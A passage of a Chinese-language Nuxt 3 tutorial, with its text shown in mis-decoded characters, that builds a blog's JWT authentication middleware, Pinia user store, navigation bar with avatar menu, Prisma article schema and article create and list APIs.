23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 import jwt from \u0026#39;jsonwebtoken\u0026#39; import db from \u0026#39;@/server/db\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler(async (event) =\u0026gt; { const jwtToken = getCookie(event, \u0026#39;access_token\u0026#39;) let userInfo = null try { const { data } = jwt.verify(jwtToken, runtimeConfig.jwtSignSecret) userInfo = data } catch (e) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } if (!userInfo?.id) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } const userRecord = await db.user.getUserById({ id: userInfo.id }) if (!userRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Could not find user.\u0026#39; }) } return { id: userRecord.id, provider: { name: userRecord.providerName, userId: userRecord.providerUserId }, nickname: userRecord.nickname, avatar: userRecord.avatar, email: userRecord.email } }) æ–°å¢ä¸€å€‹ user çš„ storeï¼Œ./stores/user.js å…§å®¹å¦‚ä¸‹ï¼š\nstores/user.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import { defineStore } from \u0026#39;pinia\u0026#39; export const useUserStore = defineStore(\u0026#39;user\u0026#39;, { state: () =\u0026gt; ({ profile: { id: null, provider: { name: null, userId: null }, nickname: null, avatar: null, email: null } }), actions: { async refreshUserProfile() { const { data, error } = await useFetch(\u0026#39;/api/user/profile\u0026#39;, { initialCache: false }) if (data.value) { this.profile = data.value } else { return error.value?.data?.message ?? \u0026#39;æœªçŸ¥éŒ¯èª¤\u0026#39; } } }, persist: { enabled: true, strategies: [ { key: \u0026#39;user\u0026#39;, storage: process.client ? localStorage : null } ] } }) æˆ‘å€‘å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ refreshUserProfile() ä¾†ç™¼é€è«‹æ±‚è‡³ /api/user/profile å–å¾—æœ€æ–°çš„ä½¿ç”¨è€…è³‡æ–™ä¾†æ›´æ–° storeã€‚\n1 2 3 4 import { useUserStore } from \u0026#39;@/stores/user\u0026#39; const userStore = useUserStore() userStore.refreshUserProfile() ä½¿ç”¨ä¼ºæœå™¨ä¸­é–“ä»¶ä¾†é©—è­‰ JWT æˆ‘å€‘çš„æœƒå“¡ç³»çµ±åœ¨ç™»å…¥å¾Œï¼Œæœƒç”¢ç”Ÿä¸€çµ„ JWT æ”¾ç½®æ–¼ cookie ä¹‹ä¸­ï¼Œåœ¨å¾Œç«¯ API ä½¿ç”¨æ™‚éƒ½è¦åœ¨å‘¼å« getCookie() ä¾†è§£æ cookieï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥å°‡é©—è­‰ JWT çš„æµç¨‹ï¼Œæ”¾ç½®åœ¨ä¼ºæœå™¨ä¸­é–“ä»¶ (middleware) ä¹‹ä¸­ï¼Œå¾Œç«¯æ”¶åˆ°çš„æ¯å€‹è«‹æ±‚å°±æœƒç¶“éé€™å€‹ä¸­é–“ä»¶ï¼Œåªè¦æœ‰å¤¾å¸¶ access_token çš„ cookie å°±æœƒé€²è¡Œé©—è­‰è§£æå‡º JWT æ‰€å«çš„ payload idï¼Œå³ç‚ºä½¿ç”¨è€…çš„ IDã€‚\nå»ºç«‹ ./server/middleware/auth.js æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nserver/middleware/auth.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import jwt from \u0026#39;jsonwebtoken\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler((event) =\u0026gt; { const jwtToken = getCookie(event, \u0026#39;access_token\u0026#39;) if (!jwtToken) { return } let userInfo = null try { const { data } = jwt.verify(jwtToken, runtimeConfig.jwtSignSecret) userInfo = data if (userInfo?.id) { event.context.auth = { user: { id: userInfo.id } } } } catch (e) { console.error(\u0026#39;Invalid token\u0026#39;) } }) ä¼ºæœå™¨çš„ä¸­é–“ä»¶åªè¦å®šç¾©åœ¨ ./server/middleware ç›®éŒ„ä¸‹å°±æœƒè‡ªå‹•è¢«è¼‰å…¥ï¼Œä¹‹å¾Œåœ¨æ¯å€‹ Server API æ”¶åˆ°è«‹æ±‚ï¼Œä¸­é–“ä»¶åªè¦æœ‰æˆåŠŸé©—è­‰ä¸¦è§£æ JWTï¼Œå°±æœƒåœ¨ event.context.auth æ·»åŠ ä½¿ç”¨è€…è³‡è¨Šï¼Œä¹‹å¾Œåœ¨ Server API çš„è™•ç†å‡½æ•¸ä¸­ï¼Œå°±å¯ä»¥ä»¥ä¸‹åˆ—ç¨‹å¼ç¢¼é€²è¡Œä½¿ç”¨ã€‚\n1 2 3 export default defineEventHandler(async (event) =\u0026gt; { const user = event.context?.auth?.user }) èª¿æ•´å¾Œçš„ ./server/profile.get.js æª”æ¡ˆï¼Œå°±æœƒä¹¾æ·¨è¨±å¤šå›‰ï¼\nserver/profile.get.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import db from \u0026#39;@/server/db\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const user = event.context?.auth?.user if (!user?.id) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } const userRecord = await db.user.getUserById({ id: user.id }) if (!userRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Could not find user.\u0026#39; }) } return { id: userRecord.id, provider: { name: userRecord.providerName, userId: userRecord.providerUserId }, nickname: userRecord.nickname, avatar: userRecord.avatar, email: userRecord.email } }) ç‚ºäº†å¯¦ä½œéƒ¨è½æ ¼ï¼Œæˆ‘å€‘ä½¿ç”¨ Prisma å¿«é€Ÿçš„å»ºç«‹è³‡æ–™åº«ç’°å¢ƒï¼Œä¹Ÿæ–¹ä¾¿å¤§å®¶å¯ä»¥ä¸‹è¼‰ç¯„ä¾‹ç¨‹å¼ç¢¼ï¼Œå°±å¯ä»¥åœ¨è‡ªå·±çš„é›»è…¦ä¸Šé‹ä½œ SQLiteã€‚ä¹Ÿçµåˆ Pinia ä¾†å°‡ä½¿ç”¨è€…çš„è³‡æ–™é€²è¡ŒæŒä¹…åŒ–çš„å„²å­˜ï¼Œé€™æ¨£æˆ‘å€‘å°±å¯ä»¥å¯¦ä½œå‡ºå¦‚åˆ¤æ–·ä½¿ç”¨è€…æ˜¯å¦ç™»å…¥æˆ–æ˜¯å»ºç«‹å°è¦½åˆ—ä¸Šçš„ç™»å…¥ç‹€æ…‹ã€‚\nç¯„ä¾‹ç¨‹å¼ç¢¼ - Nuxt 3 - å¯¦ä½œéƒ¨è½æ ¼è³‡æ–™åº«èˆ‡æœƒå“¡ç³»çµ±\nå°è¦½åˆ—æ¨¡æ¿èˆ‡æ–°å¢æ–‡ç«  ä¸Šé¢æˆ‘å€‘å®Œæˆäº†åŸºæœ¬çš„æœƒå“¡ç™»å…¥ï¼Œæ¥ä¸‹ä¾†å°‡é€²å…¥ç¶²ç«™çš„åˆ‡ç‰ˆï¼Œä»¥ä¸‹æœƒä½¿ç”¨å¸ƒå±€æ¨¡æ¿ä¾†å¯¦ç¾ï¼Œä¸Šæ–¹å°è¦½åˆ—èˆ‡ä¸‹æ–¹é¡¯ç¤ºç¶²ç«™å…§å®¹çš„æ’ç‰ˆæ–¹å¼ï¼Œæ¥ä¸‹ä¾†å°±æœƒå¿«é€Ÿçš„é€²å…¥åˆ°æ–°å¢ä¸€ç¯‡éƒ¨è½æ ¼çš„æ–‡ç« ï¼Œè©²å¦‚ä½•å¯¦ç¾ Server API èˆ‡å‰ç«¯é€²è¡Œä¸²æ¥ã€‚\né è¨­å¸ƒå±€æ¨¡æ¿ é¦–å…ˆï¼Œå»ºç«‹ä¸€å€‹é è¨­å¸ƒå±€æ¨¡æ¿ï¼Œæˆ‘å€‘é è¨ˆä½¿æ¯å€‹é é¢æ–¼ä¸Šæ–¹é¡¯ç¤ºå°è¦½åˆ—ï¼Œä¸‹æ–¹å‰‡æ˜¯ä¾æ“šä¸åŒçš„é é¢ä¾†é¡¯ç¤ºï¼Œå¤§æ¦‚å¦‚ä¸‹æ‰€ç¤ºã€‚\n1 2 3 4 5 6 7 8 9 10 11 +---------------------------+ | +-----------------------+ | | | å°è¦½åˆ— | | | +-----------------------+ | | +-----------------------+ | | | ä¸åŒé é¢çš„å…§å®¹é¡¯ç¤ºçš„ä½ç½® | | | | | | | | | | | | | | | +-----------------------+ | +---------------------------+ æˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€å€‹ default.vue æ–¼ layouts ç›®éŒ„ä¸­ï¼Œä½œç‚ºé è¨­çš„ä½ˆå±€æ¨¡æ¿ï¼Œæ¨¡æ¿å…§ç´„æœƒå¯¦ä½œä¸‹é¢çš„ç¨‹å¼ç¢¼ï¼š\n1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;header\u0026gt; \u0026lt;!-- å°è¦½åˆ— --\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;header\u0026gt; è£¡é¢å°±æ˜¯æˆ‘å€‘å¯ä»¥å¯¦ä½œå°è¦½åˆ—çš„ä½ç½®ï¼Œä¸‹æ–¹çš„ \u0026lt;slot /\u0026gt; æ’æ§½ï¼Œå³æœƒæ˜¯æˆ‘å€‘å¯ä»¥æ”¾ç½®é é¢çš„å®¹å™¨ã€‚\nå®Œæ•´çš„ ./layouts/default.vue ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nlayouts/default.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;header class=\u0026#34;flex w-full justify-center px-8 xl:px-0\u0026#34;\u0026gt; \u0026lt;nav class=\u0026#34;flex w-full max-w-7xl items-center justify-between py-2\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026lt;a aria-label=\u0026#34;TailwindBlog\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex items-center justify-between\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-3\u0026#34;\u0026gt; \u0026lt;Icon class=\u0026#34;h-12 w-12\u0026#34; name=\u0026#34;logos:nuxt-icon\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;hidden h-6 text-2xl font-semibold text-gray-700 sm:block\u0026#34;\u0026gt; Nuxt 3 Blog \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;flex items-center text-base leading-5\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-row items-center\u0026#34;\u0026gt; \u0026lt;NuxtLink class=\u0026#34;px-3 py-2 text-gray-700 transition hover:text-emerald-500\u0026#34; to=\u0026#34;/login\u0026#34; \u0026gt; ç™»å…¥ \u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useUserStore } from \u0026#39;@/stores/user\u0026#39; const userStore = useUserStore() const userProfile = computed(() =\u0026gt; userStore.profile) \u0026lt;/script\u0026gt; æ¥è‘—è¨˜å¾—èª¿æ•´ app.vue å…§å®¹ï¼Œæ·»åŠ ä¸€å€‹ \u0026lt;NuxtLayout\u0026gt; å…ƒä»¶ä¾†é¡¯ç¤ºé è¨­çš„å¸ƒå±€æ¨¡æ¿ï¼ŒåŒ…è£¹è‘—çš„ \u0026lt;NuxtPage /\u0026gt; å³æœƒæ”¾ç½®æ–¼ default.vue é è¨­æ’æ§½ä¹‹ä¸­ï¼Œå¦‚æ­¤å°±èƒ½é¡¯ç¤ºè·¯ç”±çš„é é¢ã€‚\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;NuxtLayout\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/template\u0026gt; è‡³æ­¤ï¼Œæˆ‘å€‘å°±å®Œæˆçš„ç¬¬ä¸€å€‹å°è¦½åˆ—ï¼Œå¯ä»¥ç”±å°è¦½åˆ—æä¾›çš„ã€Œç™»å…¥ã€ï¼Œåˆ‡æ›è‡³ç™»å…¥é é¢ï¼Œä¸¦ä¸”åœ¨æ¯å€‹é é¢ä¸­ï¼Œéƒ½ä½¿ç”¨é è¨­çš„å¸ƒå±€æ¨¡æ¿ï¼Œæ‰€ä»¥éƒ½æœƒé¡¯ç¤ºå°è¦½åˆ—ã€‚\nå–æ¶ˆæˆ–æ›¿æ›ç‰¹å®šé é¢çš„å¸ƒå±€æ¨¡æ¿ åœ¨ã€Nuxt3ã€‘é–‹ç®±å³ç”¨çš„ Nuxt3 ç©è½‰ç­†è¨˜ - Nuxt 3 å¸ƒå±€æ¨¡æ¿ (Layouts) å…§æœ‰ä»‹ç´¹åˆ°ï¼Œæˆ‘å€‘å¯ä»¥å»ºç«‹å¤šå€‹å¸ƒå±€æ¨¡æ¿ï¼Œè€Œ Nuxt ä¹Ÿæä¾›æˆ‘å€‘å¯ä»¥ç‚ºé é¢å…ƒä»¶å–æ¶ˆä½¿ç”¨æˆ–é¸æ“‡ç‰¹å®šçš„å¸ƒå±€æ¨¡æ¿ã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘æƒ³å°‡ç™»å…¥èˆ‡è¨»å†Šé é¢ï¼Œå–æ¶ˆå¥—ç”¨é è¨­çš„å¸ƒå±€æ¨¡æ¿ï¼Œæˆ‘å€‘å°±å¯ä»¥ä½¿ç”¨ definePageMeta() ä¾†å‚³å…¥ layout: false å±¬æ€§ä¾†å–æ¶ˆå¸ƒå±€æ¨¡æ¿çš„ä½¿ç”¨ã€‚\nèª¿æ•´ç™»å…¥é é¢ ./pages/login.vue\npages/login.vue 1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ layout: false }) \u0026lt;/script\u0026gt; å¦‚æ­¤ä¸€ä¾†ï¼Œç™»å…¥é é¢å°‡ä¸æœƒä½¿ç”¨å¸ƒå±€æ¨¡æ¿ï¼Œå°è¦½åˆ—ä¹Ÿå°±ä¸æœƒé¡¯ç¤ºã€‚\nå»ºç«‹ä½¿ç”¨è€…é¸å–® ç‚ºäº†è±å¯Œå°è¦½åˆ—ï¼Œæˆ‘å€‘å¯ä»¥ç‚ºå·²ç™»å…¥çš„ä½¿ç”¨è€…ï¼Œå»ºç«‹ä¸€å€‹ä½¿ç”¨è€…é ­åƒï¼Œé»æ“Šå¾Œå¯ä»¥é¡¯ç¤ºä½¿ç”¨è€…å°ˆç”¨çš„é¸é …ï¼Œä¾‹å¦‚ç™»å‡ºç­‰åŠŸèƒ½ã€‚\nå®‰è£ headless UI æˆ‘å€‘çš„ä½¿ç”¨çš„æ˜¯ Tailwind CSS ä¾†åšæ¨£å¼çš„è™•ç†ï¼Œheadless UI å·²ç¶“å°è£ä¸€äº›å¯¦ç”¨ä¸”å¥½çœ‹çš„å…ƒä»¶ï¼Œå…ƒä»¶åŸºæ–¼ Tailwind CSS å¯ä»¥è®“æˆ‘å€‘çš„é¢¨æ ¼æ›´ä¸€è‡´ï¼Œä¹Ÿèƒ½æ›´å½ˆæ€§çš„è‡ªè¨‚æˆè‡ªå·±å–œæ­¡çš„æ¨£å¼ã€‚\nä½¿ç”¨ NPM å®‰è£ @headlessui/vueï¼š\n1 2 3 npm install -D @headlessui/vue # or # yarn add -D @headlessui/vue èª¿æ•´ nuxt.config.tsï¼Œå°‡ @headlessui/vue æ–°å¢è‡³ build.transpile å±¬æ€§ä¹‹ä¸­ã€‚\nnuxt.config.ts 1 2 3 4 5 export default defineNuxtConfig({ build: { transpile: [\u0026#39;@headlessui/vue\u0026#39;] } }) å»ºç«‹ä½¿ç”¨è€…é ­åƒé¸å–®å…ƒä»¶ æ–°å¢ ./components/NavigationBar/NavigationBarAvatarMenu.vue å…§å®¹å¦‚ä¸‹ï¼š\ncomponents/NavigationBar/NavigationBarAvatarMenu.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;Menu as=\u0026#34;div\u0026#34; class=\u0026#34;relative inline-block text-left\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026lt;MenuButton class=\u0026#34;inline-flex w-full justify-center\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;inline-block h-10 w-10 rounded-full bg-white/90 object-cover object-center p-0.5 shadow-lg shadow-zinc-800/5 ring-1 ring-zinc-900/5 backdrop-blur hover:bg-opacity-30 focus:outline-none focus-visible:ring-2 focus-visible:ring-white focus-visible:ring-opacity-75\u0026#34; src=\u0026#34;https://images.unsplash.com/photo-1577023311546-cdc07a8454d9?ixlib=rb-1.2.1\u0026amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=128\u0026amp;q=80\u0026#34; alt=\u0026#34;ä½¿ç”¨è€…é¸å–®\u0026#34; /\u0026gt; \u0026lt;/MenuButton\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;transition enter-active-class=\u0026#34;transition duration-100 ease-out\u0026#34; enter-from-class=\u0026#34;transform scale-95 opacity-0\u0026#34; enter-to-class=\u0026#34;transform scale-100 opacity-100\u0026#34; leave-active-class=\u0026#34;transition duration-75 ease-in\u0026#34; leave-from-class=\u0026#34;transform scale-100 opacity-100\u0026#34; leave-to-class=\u0026#34;transform scale-95 opacity-0\u0026#34; \u0026gt; \u0026lt;MenuItems class=\u0026#34;absolute right-0 mt-2 w-56 origin-top-right divide-y divide-gray-100 rounded-md bg-white shadow-lg ring-1 ring-black ring-opacity-5 focus:outline-none\u0026#34; \u0026gt; \u0026lt;div class=\u0026#34;px-1 py-1\u0026#34;\u0026gt; \u0026lt;MenuItem v-slot=\u0026#34;{ active }\u0026#34;\u0026gt; \u0026lt;button :class=\u0026#34;[ active ? \u0026#39;bg-emerald-500 text-white\u0026#39; : \u0026#39;text-gray-900\u0026#39;, \u0026#39;group flex w-full items-center rounded-md px-2 py-2 text-sm\u0026#39; ]\u0026#34; \u0026gt; \u0026lt;Icon :active=\u0026#34;active\u0026#34; class=\u0026#34;mr-2 h-5 w-5 text-emerald-400\u0026#34; name=\u0026#34;ri:logout-box-line\u0026#34; aria-hidden=\u0026#34;true\u0026#34; /\u0026gt; ç™»å‡º \u0026lt;/button\u0026gt; \u0026lt;/MenuItem\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/MenuItems\u0026gt; \u0026lt;/transition\u0026gt; \u0026lt;/Menu\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { Menu, MenuButton, MenuItems, MenuItem } from \u0026#39;@headlessui/vue\u0026#39; \u0026lt;/script\u0026gt; å°‡ \u0026lt;NavigationBarAvatarMenu\u0026gt; å…ƒä»¶æ·»åŠ è‡³å°è¦½åˆ—ä¹‹ä¸­ï¼Œæˆ‘å€‘å°±å¯ä»¥æ“æœ‰ä¸€å€‹ä½¿ç”¨è€…é ­åƒçš„é¸å–®å›‰ã€‚\nçµåˆä½¿ç”¨è€… Store ä¾†æ§åˆ¶é¡¯ç¤ºçš„æ™‚æ©Ÿ ä½¿ç”¨è€…é ­åƒé¸å–®çš„å…ƒä»¶æ‡‰è©²æ§åˆ¶æ–¼ä½¿ç”¨è€…ç™»å…¥ä¹‹å¾Œå†é¡¯ç¤ºï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥çµåˆ Pinia é€²è¡Œç‹€æ…‹ç®¡ç†ï¼Œä¾†æª¢æŸ¥ä½¿ç”¨è€…è³‡è¨Šçš„ store æ˜¯å¦å…·æœ‰è³‡æ–™ä¸”ç¬¦åˆæˆ‘å€‘çš„åˆ¤å®šä¾æ“šå†é€²è¡Œé¡¯ç¤ºï¼Œå¦å‰‡ï¼Œæˆ‘å€‘åƒ…éœ€è¦æ¸²æŸ“å‡ºç™»å…¥çš„æŒ‰éˆ•å³å¯ã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘å¾ User Store å–å‡ºä½¿ç”¨è€…è³‡è¨Š (Profile)ï¼Œä¸¦åˆ¤æ–·æ˜¯å¦æœ‰ id ä¾†æ±ºå®šè¦é¡¯ç¤ºä½¿ç”¨è€…é ­åƒé¸å–®æˆ–ç™»å…¥ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;NavigationBarAvatarMenu v-if=\u0026#34;userProfile?.id\u0026#34; /\u0026gt; \u0026lt;NuxtLink v-else class=\u0026#34;px-3 py-2 text-gray-700 transition hover:text-emerald-500\u0026#34; to=\u0026#34;/login\u0026#34; \u0026gt; ç™»å…¥ \u0026lt;/NuxtLink\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useUserStore } from \u0026#39;@/stores/user\u0026#39; const userStore = useUserStore() const userProfile = computed(() =\u0026gt; userStore.profile) \u0026lt;/script\u0026gt; æ•´å€‹å®Œæˆå¾Œï¼Œä»‹é¢çœ‹èµ·ä¾†å°±æœƒæ¯”è¼ƒä¹¾æ·¨ä¹Ÿç¬¦åˆç™»å…¥èˆ‡æœªç™»å…¥æ™‚ï¼Œæ‡‰è©²é¡¯ç¤ºçš„ä»‹é¢æ¨£å­ã€‚\næ–°å¢éƒ¨è½æ ¼æ–‡ç«  ç•¶æˆ‘å€‘è™•ç†å¥½ç™»å…¥å¾Œï¼Œå°±é–‹å¯ä»¥é–‹å§‹ä¾†å¯¦ä½œä½¿ç”¨è€…å»ºç«‹éƒ¨è½æ ¼çš„æ–‡ç« å›‰ï¼\nå»ºç«‹æ–‡ç« è³‡æ–™è¡¨ æˆ‘å€‘çš„è³‡æ–™åº«ï¼Œæ˜¯é€é Prisma çš„ Schema ä¾†è‡ªå‹•ç”¢ç”Ÿè³‡æ–™è¡¨ï¼Œæˆ‘å€‘å¯ä»¥å»ºç«‹å¦‚ä¸‹çš„ Schemaï¼Œä¾†ä½œç‚ºå„²å­˜æ–‡ç« å…§å®¹çš„è³‡æ–™è¡¨ã€‚\n1 2 3 4 5 6 7 8 9 10 model Article { id Int @id @default(autoincrement()) title String content String cover String tags String authorId String? createdAt DateTime @default(now()) updatedAt DateTime @updatedAt } æ¬„ä½ç›¸å°ç°¡å–®ï¼Œå„å€‹æ¬„ä½çš„ç”¨é€”èˆ‡èªªæ˜å¦‚ä¸‹ï¼š\nid: æ–‡ç« çš„ IDï¼Œæ¡ç”¨è‡ªå‹•éå¢çš„æ•¸å­—ã€‚ title: æ–‡ç« çš„æ¨™é¡Œã€‚ content: æ–‡ç« çš„å…§å®¹ã€‚ cover: æ–‡ç« çš„å°é¢åœ–ç‰‡ã€‚ tags: æ–‡ç« çš„æ¨™ç±¤ã€‚ authorId: å°æ‡‰ User è³‡æ–™è¡¨çš„ id æ¬„ä½ï¼Œè¡¨ç¤ºæ–‡ç« çš„ä½œè€…ã€‚ createdAt: æ–‡ç« å»ºç«‹æ™‚é–“ï¼Œé è¨­ç‚ºæ’å…¥è©²ç­†è³‡æ–™çš„æ™‚é–“ã€‚ updatedAt: ä½¿ç”¨è€…æ›´æ–°æ–‡ç« è³‡æ–™çš„æ™‚é–“ï¼Œé è¨­ç‚ºæ›´æ–°è©²ç­†è³‡æ–™çš„æ™‚é–“ã€‚ å¦å¤–ï¼Œæˆ‘æƒ³è®“ Article å…·æœ‰é—œè¯æ€§ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ä½¿ç”¨ Prisma æä¾›çš„èªæ³•ï¼Œä¾†å»ºç«‹èˆ‡ User çš„å¤–éµ (Foreign Key)ï¼Œæœ€å¾Œå®Œæ•´çš„ schema.prisma å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // This is your Prisma schema file, // learn more about it in the docs: https://pris.ly/d/prisma-schema generator client { provider = \u0026#34;prisma-client-js\u0026#34; } datasource db { provider = \u0026#34;sqlite\u0026#34; url = \u0026#34;file:./dev.db\u0026#34; } model User { id String @id @default(uuid()) providerName String? providerUserId String? nickname String @default(\u0026#34;User\u0026#34;) email String @unique password String? avatar String? emailVerified Boolean @default(false) createdAt DateTime @default(now()) updatedAt DateTime @updatedAt Article Article[] } model Article { id Int @id @default(autoincrement()) title String content String cover String tags String authorId String? createdAt DateTime @default(now()) updatedAt DateTime @updatedAt User User? @relation(fields: [authorId], references: [id]) } è¨˜å¾—åŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼Œä¾†è®“ Prisma å»ºç«‹æ–°çš„è³‡æ–™è¡¨ã€‚\n1 npx prisma db push å»ºç«‹æ–°å¢æ–‡ç« çš„ API å»ºç«‹ ./server/api/manage/articles.post.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nserver/api/manage/articles.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import db from \u0026#39;@/server/db\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const user = event.context?.auth?.user if (!user?.id) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } const body = await readBody(event) const authorId = user.id const articleRecord = await db.article.createArticle({ title: body.title, content: body.content, cover: body.cover, tags: body.tags, authorId }) if (!articleRecord) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Create article failed. Please try again later.\u0026#39; }) } return articleRecord }) æ•´å€‹ Server API çš„é‹ä½œæµç¨‹å¦‚ä¸‹ï¼š\nä½¿ç”¨è€…å°‡æ¬²æ–°å¢çš„æ–‡ç« è³‡æ–™ä»¥ POST ç™¼é€è‡³ /api/manage/articleï¼Œä¼ºæœå™¨ä¸­é–“ä»¶ï¼Œå°‡æœƒè§£æ JWT ä¾†å¾—åˆ° userã€‚ åˆ¤æ–· user.id ä¾†æ±ºå®šæ˜¯å¦å…·æœ‰æ¬Šé™ï¼Œå¦‚æœæ­£ç¢ºè§£æ JWTï¼Œè¡¨ç¤ºè«‹æ±‚ç‚ºä¸€å€‹å·²ç™»å…¥çš„ä½¿ç”¨è€…ç™¼é€ï¼Œä¹Ÿå°‡æ”¾è¡Œçµ¦äºˆæ–°å¢æ–‡ç« ã€‚ è™•ç†å‡½æ•¸å°‡è§£æ Body å…§çš„è³‡æ–™ï¼Œä¸¦å»ºæ§‹å‡ºå¾€è³‡æ–™åº«æ–°å¢æ–‡ç« è¨˜éŒ„çš„å…§å®¹ã€‚ åˆ¤æ–·æ˜¯å¦æ–°å¢æˆåŠŸï¼Œå›å‚³æ–°å¢çš„æ–‡ç« è³‡æ–™ã€‚ å»ºç«‹æ–‡ç« çš„ Prisma Client æ“ä½œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 async createArticle(options) { const articleRecord = await prisma.article .create({ data: { title: options.title, content: options.content, cover: options.cover, tags: options.tags, authorId: options.authorId } }) .catch((error) =\u0026gt; { console.error(error) throw createError({ statusCode: 500, statusMessage: \u0026#39;Could not create article. Please try again later.\u0026#39; }) }) return articleRecord } æˆ‘å€‘å°±å®Œæˆäº†å»ºç«‹æ–‡ç« çš„ API å›‰ï¼\nå–å¾—éƒ¨è½æ ¼æ–‡ç«  ä½¿ç”¨ Prisma Client ä¾†å–å¾—æ–‡ç« ï¼Œä¹Ÿéå¸¸æ–¹ä¾¿ï¼Œå¦‚ä¸‹ç¨‹å¼ç¢¼ï¼Œæˆ‘å€‘å°±èƒ½å–å‡ºæ–‡ç« è³‡æ–™ä¸¦ä»¥å»ºç«‹æ™‚é–“éæ¸›æ’åºå›‰ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 async getArticles(options = {}) { const articleRecords = await prisma.article .findMany({ orderBy: { createdAt: \u0026#39;desc\u0026#39; }, skip: options.pageSize ? options.page * options.pageSize : undefined, take: options.pageSize }) .catch((error) =\u0026gt; { console.error(error) throw createError({ statusCode: 500, statusMessage: \u0026#39;Could not create user. Please try again later.\u0026#39; }) }) return articleRecords } ./server/api/articles.get.js æ˜¯å¯¦ä½œå–å¾—æ–‡ç« çš„ APIï¼Œæˆ‘å€‘æœŸæœ›ä»»ä½•äººéƒ½å¯ä»¥ç€è¦½é€™å€‹éƒ¨è½æ ¼çš„æ–‡ç« ï¼Œæ‰€ä»¥é€™éš» API æˆ‘å€‘ç„¡éœ€é©—è­‰ä½¿ç”¨è€…å³å¯æ”¾è¡Œï¼Œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nserver/api/articles.get.js 1 2 3 4 5 6 7 import db from \u0026#39;@/server/db\u0026#39; export default defineEventHandler(async () =\u0026gt; { const articlesRecord = await 